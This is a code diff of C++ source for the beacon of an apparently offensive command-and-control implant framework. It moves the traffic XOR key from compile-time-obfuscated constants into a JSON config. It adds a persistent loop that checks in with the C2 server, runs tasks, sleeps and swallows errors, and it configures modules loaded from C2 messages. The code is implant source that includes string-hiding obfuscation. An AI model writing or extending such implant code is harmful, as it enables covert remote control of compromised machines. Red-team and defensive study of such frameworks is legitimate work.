@@ -32,12 +32,12 @@ typedef ModuleCmd* (*constructProc)();
 using namespace std;
 
 
-// XOR encrypted at compile time, so don't appear in string
-constexpr std::string_view _KeyTraficEncryption_ = "dfsdgferhzdzxczevre5595485sdg";
-constexpr std::string_view mainKeyConfig = ".CRT$XCL";
+// // XOR encrypted at compile time, so don't appear in string
+// constexpr std::string_view _KeyTraficEncryption_ = "dfsdgferhzdzxczevre5595485sdg";
+// constexpr std::string_view mainKeyConfig = ".CRT$XCL";
 
-// compile time encryption
-constexpr std::array<char, 29> _EncryptedKeyTraficEncryption_ = compileTimeXOR<29, 8>(_KeyTraficEncryption_, mainKeyConfig);
+// // compile time encryption
+// constexpr std::array<char, 29> _EncryptedKeyTraficEncryption_ = compileTimeXOR<29, 8>(_KeyTraficEncryption_, mainKeyConfig);
 
 
 #ifdef __linux__
@@ -100,10 +100,15 @@ IntegrityLevel GetCurrentProcessIntegrityLevel()
 #endif
 
 
-Beacon::Beacon(const std::string& ip, int port)
+Beacon::Beacon()
 {	
-	m_ip = ip;
-	m_port = port;
+	// // decrypt key
+    // std::string keyDecrypted(std::begin(_EncryptedKeyTraficEncryption_), std::end(_EncryptedKeyTraficEncryption_));
+    // std::string key(mainKeyConfig);
+    // XOR(keyDecrypted, key);
+
+	// m_key=keyDecrypted;
+
 	m_beaconHash = random_string(SizeBeaconHash);
 	m_aliveTimerMs = 1000;
 
@@ -223,12 +228,51 @@ Beacon::Beacon(const std::string& ip, int port)
 		m_privilege = "HIGH";
 
 #endif
-	// decrypt key
-    std::string keyDecrypted(std::begin(_EncryptedKeyTraficEncryption_), std::end(_EncryptedKeyTraficEncryption_));
-    std::string key(mainKeyConfig);
-    XOR(keyDecrypted, key);
 
-	m_key=keyDecrypted;
+}
+
+
+void Beacon::run()
+{
+	bool exit = false;
+	while (!exit)
+	{
+		try 
+		{
+			checkIn();
+
+			exit = runTasks();
+			
+			sleep();
+		}
+		catch(const std::exception& ex)
+		{
+			// std::cout << "Exeption " << std::endl;
+			// std::cout << "Exeption " << ex.what() << std::endl;
+			sleep();
+		}
+		catch (...) 
+		{
+			// std::cout << "Exeption" << std::endl;
+			sleep();
+		}
+	}
+
+	checkIn();
+}
+
+
+bool Beacon::initConfig(const std::string& config)
+{
+	nlohmann::json beaconConfig = nlohmann::json::parse(config);
+
+	m_key = beaconConfig["xorKey"].get<std::string>();
+
+	m_modulesConfig = beaconConfig["ModulesConfig"];
+
+	std::cout << "m_modulesConfig " << m_modulesConfig << std::endl;
+
+	return true;
 }
 
 
@@ -745,7 +789,21 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		}
 
 		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
+
+		// initConfig for modules
+		nlohmann::json config = m_modulesConfig;
+        for (auto& it : config.items())
+		{
+			unsigned long long moduleHash = djb2(it.key());			
+			if(moduleCmd_.get()->getHash() == moduleHash)
+			{
+				moduleCmd_.get()->initConfig(it.value());
+			}
+		}
+
 		m_moduleCmd.push_back(std::move(moduleCmd_));
+
+
 
 		c2RetMessage.set_returnvalue(CmdStatusSuccess);
 		return false;
